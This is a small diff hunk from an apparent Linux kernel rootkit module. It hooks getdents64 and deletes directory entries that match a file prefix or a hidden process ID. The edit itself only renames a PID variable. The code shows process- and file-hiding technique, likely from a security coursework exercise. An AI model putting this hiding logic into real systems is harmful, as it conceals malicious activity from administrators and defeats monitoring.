@@ -117,7 +117,7 @@ asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs){
       d = (struct linux_dirent64 *)(dirp + bpos);
 
       char cmd_buffer[10];
-      snprintf(cmd_buffer, 10, "%d", sneaky_PID);
+      snprintf(cmd_buffer, 10, "%d", sneaky_pid);
       if ((strcmp(d->d_name, PREFIX) == 0) || (strcmp(d->d_name, cmd_buffer) == 0)) {
       //if(memcmp(PREFIX, d->d_name, strlen(PREFIX)) == 0 ){
         memmove((char*) dirp + bpos, (char*) dirp + bpos + d->d_reclen, nread - (bpos + d->d_reclen));
